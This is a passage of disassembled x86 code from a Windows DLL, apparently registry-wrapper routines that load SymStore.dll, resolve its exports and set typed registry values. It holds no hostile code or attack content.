		cmp	[esi+0Ch], ebx
		mov	[ebp+var_4], eax
		jz	short loc_6AF36D97
		xor	eax, eax
		inc	eax
		jmp	loc_6AF36EBC
; ---------------------------------------------------------------------------

loc_6AF36D97:				; CODE XREF: Ordinal244+1Aj
		push	edi		; Args
		mov	edi, 104h
		push	edi		; uSize
		lea	eax, [ebp+LibFileName]
		push	eax		; lpBuffer
		call	ds:GetSystemDirectoryA
		cmp	eax, ebx
		jz	loc_6AF36EAE
		cmp	eax, edi
		ja	loc_6AF36EAE
		push	offset String2	; "\\SymStore.dll"
		lea	eax, [ebp+LibFileName]
		push	eax		; lpString1
		call	ds:lstrcatA
		lea	eax, [ebp+LibFileName]
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		cmp	eax, ebx
		mov	[esi+0Ch], eax
		jnz	short loc_6AF36DEB
		push	offset aCregistryIniti ; "CRegistry::Initialize() : LoadLibrary()"...
		jmp	loc_6AF36EB3
; ---------------------------------------------------------------------------

loc_6AF36DEB:				; CODE XREF: Ordinal244+6Cj
		mov	edi, ds:GetProcAddress
		push	1		; lpProcName
		push	eax		; hModule
		call	edi ; GetProcAddress
		push	3		; lpProcName
		push	dword ptr [esi+0Ch] ; hModule
		mov	[esi+10h], eax
		call	edi ; GetProcAddress
		push	4		; lpProcName
		push	dword ptr [esi+0Ch] ; hModule
		mov	[esi+14h], eax
		call	edi ; GetProcAddress
		push	5		; lpProcName
		push	dword ptr [esi+0Ch] ; hModule
		mov	[esi+18h], eax
		call	edi ; GetProcAddress
		push	7		; lpProcName
		push	dword ptr [esi+0Ch] ; hModule
		mov	[esi+1Ch], eax
		call	edi ; GetProcAddress
		push	8		; lpProcName
		push	dword ptr [esi+0Ch] ; hModule
		mov	[esi+20h], eax
		call	edi ; GetProcAddress
		push	0Bh		; lpProcName
		push	dword ptr [esi+0Ch] ; hModule
		mov	[esi+24h], eax
		call	edi ; GetProcAddress
		push	0Eh		; lpProcName
		push	dword ptr [esi+0Ch] ; hModule
		mov	[esi+28h], eax
		call	edi ; GetProcAddress
		push	12h		; lpProcName
		push	dword ptr [esi+0Ch] ; hModule
		mov	[esi+2Ch], eax
		call	edi ; GetProcAddress
		cmp	[esi+10h], ebx
		mov	[esi+30h], eax
		jz	short loc_6AF36E7A
		cmp	[esi+14h], ebx
		jz	short loc_6AF36E7A
		cmp	[esi+18h], ebx
		jz	short loc_6AF36E7A
		cmp	[esi+1Ch], ebx
		jz	short loc_6AF36E7A
		cmp	[esi+20h], ebx
		jz	short loc_6AF36E7A
		cmp	[esi+24h], ebx
		jz	short loc_6AF36E7A
		cmp	[esi+28h], ebx
		jz	short loc_6AF36E7A
		cmp	[esi+2Ch], ebx
		jz	short loc_6AF36E7A
		cmp	eax, ebx
		jz	short loc_6AF36E7A
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF36EBB
; ---------------------------------------------------------------------------

loc_6AF36E7A:				; CODE XREF: Ordinal244+D9j
					; Ordinal244+DEj ...
		push	offset aCregistryIni_0 ; "CRegistry::Initialize() : GetProcAddres"...
		call	sub_6AF3102E
		pop	ecx
		push	dword ptr [esi+0Ch] ; hLibModule
		mov	[esi+10h], ebx
		mov	[esi+14h], ebx
		mov	[esi+18h], ebx
		mov	[esi+1Ch], ebx
		mov	[esi+20h], ebx
		mov	[esi+24h], ebx
		mov	[esi+28h], ebx
		mov	[esi+2Ch], ebx
		mov	[esi+30h], ebx
		call	ds:FreeLibrary
		mov	[esi+0Ch], ebx
		jmp	short loc_6AF36EB9
; ---------------------------------------------------------------------------

loc_6AF36EAE:				; CODE XREF: Ordinal244+3Aj
					; Ordinal244+42j
		push	offset aCregistryIni_1 ; "CRegistry::Initialize() : GetSystemDire"...

loc_6AF36EB3:				; CODE XREF: Ordinal244+73j
		call	sub_6AF3102E
		pop	ecx

loc_6AF36EB9:				; CODE XREF: Ordinal244+139j
		xor	eax, eax

loc_6AF36EBB:				; CODE XREF: Ordinal244+105j
		pop	edi

loc_6AF36EBC:				; CODE XREF: Ordinal244+1Fj
		mov	ecx, [ebp+var_4]
		pop	esi
		pop	ebx
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
Ordinal244	endp

; Exported entry 230.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal230
Ordinal230	proc near		; CODE XREF: sub_6AF36F68+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF56154
		call	Ordinal233
		mov	eax, [esi+0Ch]
		test	eax, eax
		jz	short loc_6AF36EE8
		push	eax		; hLibModule
		call	ds:FreeLibrary
		and	dword ptr [esi+0Ch], 0

loc_6AF36EE8:				; CODE XREF: Ordinal230+13j
		pop	esi
		retn
Ordinal230	endp

; Exported entry 232.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal232
Ordinal232	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		call	Ordinal244
		test	eax, eax
		jz	short loc_6AF36F56
		xor	edi, edi
		cmp	[esi+28h], edi
		jz	short loc_6AF36F56
		cmp	[esi+14h], edi
		jz	short loc_6AF36F56
		mov	ecx, esi
		call	Ordinal233
		lea	ebx, [esi+4]
		push	ebx
		push	[ebp+arg_8]
		push	edi
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	dword ptr [esi+28h]
		cmp	eax, edi
		mov	[esi+8], eax
		jz	short loc_6AF36F5F
		cmp	[ebp+arg_C], edi
		jnz	short loc_6AF36F32
		push	offset aCregistryOpenM ; "CRegistry::Open() : m_pfnSymRegOpenKeyE"...
		jmp	short loc_6AF36F50
; ---------------------------------------------------------------------------

loc_6AF36F32:				; CODE XREF: Ordinal232+3Fj
		push	edi
		push	ebx
		push	edi
		push	[ebp+arg_8]
		push	edi
		push	edi
		push	edi
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	dword ptr [esi+14h]
		cmp	eax, edi
		mov	[esi+8], eax
		jz	short loc_6AF36F5F
		push	offset aCregistryOpe_0 ; "CRegistry::Open() : m_pfnSymRegCreateKe"...

loc_6AF36F50:				; CODE XREF: Ordinal232+46j
		call	sub_6AF3102E
		pop	ecx

loc_6AF36F56:				; CODE XREF: Ordinal232+Fj
					; Ordinal232+16j ...
		xor	eax, eax

loc_6AF36F58:				; CODE XREF: Ordinal232+7Cj
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	10h
; ---------------------------------------------------------------------------

loc_6AF36F5F:				; CODE XREF: Ordinal232+3Aj
					; Ordinal232+5Fj
		xor	eax, eax
		cmp	[ebx], edi
		setnz	al
		jmp	short loc_6AF36F58
Ordinal232	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF36F68(void *, char)
sub_6AF36F68	proc near		; DATA XREF: .rdata:off_6AF56154o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal230
		test	[esp+4+arg_0], 1
		jz	short loc_6AF36F7E
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF36F7E:				; CODE XREF: sub_6AF36F68+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF36F68	endp

; Exported entry 251.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal251
Ordinal251	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		cmp	[ecx+8], eax
		setz	al
		retn
Ordinal251	endp

; Exported entry 259.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal259
Ordinal259	proc near		; CODE XREF: Ordinal159+2Cp
					; Ordinal208+2Cp ...

arg_0		= dword	ptr  4

		mov	eax, ecx
		mov	ecx, [esp+arg_0]
		cmp	eax, ecx
		jz	short locret_6AF36F9D
		mov	cl, [ecx+8]
		mov	[eax+8], cl

locret_6AF36F9D:			; CODE XREF: Ordinal259+8j
		retn	4
Ordinal259	endp

; Exported entry 261.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal261
Ordinal261	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		xor	ebx, ebx
		mov	esi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[edi], ebx
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+arg_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+arg_4], ebx
		call	dword ptr [eax+8]
		test	al, al
		jnz	short loc_6AF36FE3
		push	offset aCvaluecollecti ; "CValueCollection::GetType() :	GetReadVa"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF36FED
; ---------------------------------------------------------------------------

loc_6AF36FE3:				; CODE XREF: Ordinal261+34j
		mov	eax, [ebp+arg_4]
		mov	eax, [eax+8]
		mov	[edi], eax
		mov	bl, 1

loc_6AF36FED:				; CODE XREF: Ordinal261+41j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal261	endp

; Exported entry 262.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal262
Ordinal262	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	bl, [esi+9]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn
Ordinal262	endp

; Exported entry 263.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal263
Ordinal263	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	al, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+9], al
		call	Ordinal1230
		mov	al, 1
		pop	esi
		leave
		retn	4
Ordinal263	endp

; Exported entry 265.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal265
Ordinal265	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF37094
		push	offset aCvaluecollec_0 ; "CValueCollection::SetValue(bool) : GetW"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF370A9
; ---------------------------------------------------------------------------

loc_6AF37094:				; CODE XREF: Ordinal265+2Ej
		mov	eax, [ebp+var_4]
		mov	dword ptr [eax+8], 0Ah
		mov	al, [ebp+arg_4]
		mov	ecx, [ebp+var_4]
		mov	[ecx+10h], al
		mov	bl, 1

loc_6AF370A9:				; CODE XREF: Ordinal265+3Bj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal265	endp

; Exported entry 267.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal267
Ordinal267	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF370F6
		push	offset aCvaluecollec_1 ; "CValueCollection::SetValue(BYTE) : GetW"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF37108
; ---------------------------------------------------------------------------

loc_6AF370F6:				; CODE XREF: Ordinal267+2Ej
		mov	eax, [ebp+var_4]
		xor	ebx, ebx
		inc	ebx
		mov	[eax+8], ebx
		mov	al, [ebp+arg_4]
		mov	ecx, [ebp+var_4]
		mov	[ecx+10h], al

loc_6AF37108:				; CODE XREF: Ordinal267+3Bj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal267	endp

; Exported entry 269.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal269
Ordinal269	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= word ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF37155
		push	offset aCvaluecollec_2 ; "CValueCollection::SetValue(WORD) : GetW"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3716C
; ---------------------------------------------------------------------------

loc_6AF37155:				; CODE XREF: Ordinal269+2Ej
		mov	eax, [ebp+var_4]
		mov	dword ptr [eax+8], 2
		mov	ax, [ebp+arg_4]
		mov	ecx, [ebp+var_4]
		mov	[ecx+10h], ax
		mov	bl, 1

loc_6AF3716C:				; CODE XREF: Ordinal269+3Bj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal269	endp

; Exported entry 271.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal271
Ordinal271	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF371B9
		push	offset aCvaluecollec_3 ; "CValueCollection::SetValue(DWORD) : Get"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF371CE
; ---------------------------------------------------------------------------

loc_6AF371B9:				; CODE XREF: Ordinal271+2Ej
		mov	eax, [ebp+var_4]
		mov	dword ptr [eax+8], 3
		mov	eax, [ebp+arg_4]
		mov	ecx, [ebp+var_4]
		mov	[ecx+10h], eax
		mov	bl, 1

loc_6AF371CE:				; CODE XREF: Ordinal271+3Bj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal271	endp

; Exported entry 273.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal273
Ordinal273	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF3721B
		push	offset aCvaluecollec_4 ; "CValueCollection::SetValue(ULONGLONG)	:"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF37239
; ---------------------------------------------------------------------------

loc_6AF3721B:				; CODE XREF: Ordinal273+2Ej
		mov	eax, [ebp+var_4]
		mov	dword ptr [eax+8], 4
		mov	ecx, [ebp+var_4]
		mov	eax, [ebp+arg_4]
		mov	[ecx+10h], eax
		mov	eax, [ebp+arg_8]
		mov	ecx, [ebp+var_4]
		mov	[ecx+14h], eax
		mov	bl, 1

loc_6AF37239:				; CODE XREF: Ordinal273+3Bj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	0Ch
Ordinal273	endp

; Exported entry 275.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal275(int,	double)
		public Ordinal275
Ordinal275	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= qword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF37286
		push	offset aCvaluecollec_5 ; "CValueCollection::SetValue(double) : Ge"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3729B
; ---------------------------------------------------------------------------

loc_6AF37286:				; CODE XREF: Ordinal275+2Ej
		mov	eax, [ebp+var_4]
		fld	[ebp+arg_4]
		mov	dword ptr [eax+8], 5
		mov	eax, [ebp+var_4]
		fstp	qword ptr [eax+10h]
		mov	bl, 1

loc_6AF3729B:				; CODE XREF: Ordinal275+3Bj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	0Ch
Ordinal275	endp

; Exported entry 277.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal277
Ordinal277	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF372E8
		push	offset aCvaluecollec_6 ; "CValueCollection::SetValue(long) : GetW"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF372FD
; ---------------------------------------------------------------------------

loc_6AF372E8:				; CODE XREF: Ordinal277+2Ej
		mov	eax, [ebp+var_4]
		mov	dword ptr [eax+8], 6
		mov	eax, [ebp+arg_4]
		mov	ecx, [ebp+var_4]
		mov	[ecx+10h], eax
		mov	bl, 1

loc_6AF372FD:				; CODE XREF: Ordinal277+3Bj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal277	endp

; Exported entry 280.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal280(char	Args, void *Src, size_t	Size)
		public Ordinal280
Ordinal280	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
Args		= byte ptr  8
Src		= dword	ptr  0Ch
Size		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		xor	ebx, ebx
		cmp	[ebp+Src], ebx
		push	esi
		mov	esi, ecx
		jnz	short loc_6AF37354
		cmp	[ebp+Size], ebx
		ja	short loc_6AF37359

loc_6AF37323:				; CODE XREF: Ordinal280+4Aj
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	dword ptr [ebp+Args] ; Args
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF37368
		push	offset aCvaluecollec_7 ; "CValueCollection::SetValue(LPVOID) : Ge"...

loc_6AF3734C:				; CODE XREF: Ordinal280+77j
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF373AC
; ---------------------------------------------------------------------------

loc_6AF37354:				; CODE XREF: Ordinal280+Fj
		cmp	[ebp+Size], ebx
		jnz	short loc_6AF37323

loc_6AF37359:				; CODE XREF: Ordinal280+14j
		push	offset aCvaluecollec_8 ; "CValueCollection::SetValue(LPVOID) : pD"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	short loc_6AF373B6
; ---------------------------------------------------------------------------

loc_6AF37368:				; CODE XREF: Ordinal280+38j
		cmp	[ebp+Size], ebx
		jbe	short loc_6AF373A0
		mov	ecx, [ebp+var_4]
		push	[ebp+Size]
		add	ecx, 28h
		call	Ordinal870
		test	eax, eax
		jnz	short loc_6AF37386
		push	offset aCvaluecollec_9 ; "CValueCollection::SetValue(LPVOID) : pV"...
		jmp	short loc_6AF3734C
; ---------------------------------------------------------------------------

loc_6AF37386:				; CODE XREF: Ordinal280+70j
		push	[ebp+Size]	; Size
		mov	ecx, [ebp+var_4]
		push	[ebp+Src]	; Src
		add	ecx, 28h
		call	Ordinal865
		push	eax		; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF373A0:				; CODE XREF: Ordinal280+5Ej
		mov	eax, [ebp+var_4]
		mov	dword ptr [eax+8], 9
		mov	bl, 1

loc_6AF373AC:				; CODE XREF: Ordinal280+45j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		mov	al, bl

loc_6AF373B6:				; CODE XREF: Ordinal280+59j
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal280	endp ; sp-analysis failed

; Exported entry 288.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal288(int,	VARIANTARG *pvargSrc)
		public Ordinal288
Ordinal288	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
pvargSrc	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF373F9
		push	offset aCvaluecolle_10 ; "CValueCollection::SetValue(VARIANT) :	G"...
		call	sub_6AF3102E

loc_6AF373F6:				; CODE XREF: Ordinal288+5Dj
		pop	ecx
		jmp	short loc_6AF37427
; ---------------------------------------------------------------------------

loc_6AF373F9:				; CODE XREF: Ordinal288+2Ej
		mov	eax, [ebp+var_4]
		push	[ebp+pvargSrc]	; pvargSrc
		add	eax, 18h
		push	eax		; pvarDest
		call	ds:VariantCopyInd
		cmp	eax, ebx
		jge	short loc_6AF3741B
		push	eax		; Args
		push	offset aCvaluecolle_11 ; "CValueCollection::SetValue(VARIANT) :	V"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF373F6
; ---------------------------------------------------------------------------

loc_6AF3741B:				; CODE XREF: Ordinal288+4Fj
		mov	eax, [ebp+var_4]
		mov	dword ptr [eax+8], 0Bh
		mov	bl, 1

loc_6AF37427:				; CODE XREF: Ordinal288+3Bj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal288	endp

; Exported entry 291.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal291
Ordinal291	proc near		; DATA XREF: .rdata:off_6AF66098o

var_3C		= byte ptr -3Ch
var_24		= byte ptr -24h
var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_8]
		xor	ebx, ebx
		mov	esi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[edi], ebx
		call	Ordinal1228
		push	2
		lea	ecx, [ebp+var_3C]
		call	Ordinal881
		push	[ebp+arg_4]
		lea	ecx, [ebp+var_24]
		push	[ebp+arg_0]
		call	Ordinal876
		mov	eax, [esi]
		lea	ecx, [ebp+var_3C]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+14h]
		test	al, al
		jnz	short loc_6AF3748C
		push	offset aCvaluecolle_12 ; "CValueCollection::Save() : SaveArchive("...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF37498
; ---------------------------------------------------------------------------

loc_6AF3748C:				; CODE XREF: Ordinal291+46j
		lea	ecx, [ebp+var_3C]
		call	Ordinal1435
		mov	[edi], eax
		mov	bl, 1

loc_6AF37498:				; CODE XREF: Ordinal291+53j
		lea	ecx, [ebp+var_3C]
		call	Ordinal882
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	0Ch
Ordinal291	endp

; Exported entry 292.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal292
Ordinal292	proc near		; DATA XREF: .rdata:off_6AF66098o

var_3C		= byte ptr -3Ch
var_24		= byte ptr -24h
var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_8]
		and	dword ptr [edi], 0
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		xor	ebx, ebx
		inc	ebx
		push	ebx
		lea	ecx, [ebp+var_3C]
		call	Ordinal881
		push	[ebp+arg_4]
		lea	ecx, [ebp+var_24]
		push	[ebp+arg_0]
		call	Ordinal876
		mov	eax, [esi]
		lea	ecx, [ebp+var_3C]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+10h]
		test	al, al
		jnz	short loc_6AF3750A
		push	offset aCvaluecolle_13 ; "CValueCollection::Load() : LoadArchive("...
		call	sub_6AF3102E
		pop	ecx
		xor	bl, bl
		jmp	short loc_6AF37514
; ---------------------------------------------------------------------------

loc_6AF3750A:				; CODE XREF: Ordinal292+48j
		lea	ecx, [ebp+var_3C]
		call	Ordinal1435
		mov	[edi], eax

loc_6AF37514:				; CODE XREF: Ordinal292+57j
		lea	ecx, [ebp+var_3C]
		call	Ordinal882
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	0Ch
Ordinal292	endp

; Exported entry 293.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal293
Ordinal293	proc near		; DATA XREF: .rdata:off_6AF66098o

var_24		= byte ptr -24h
var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		xor	ebx, ebx
		mov	esi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
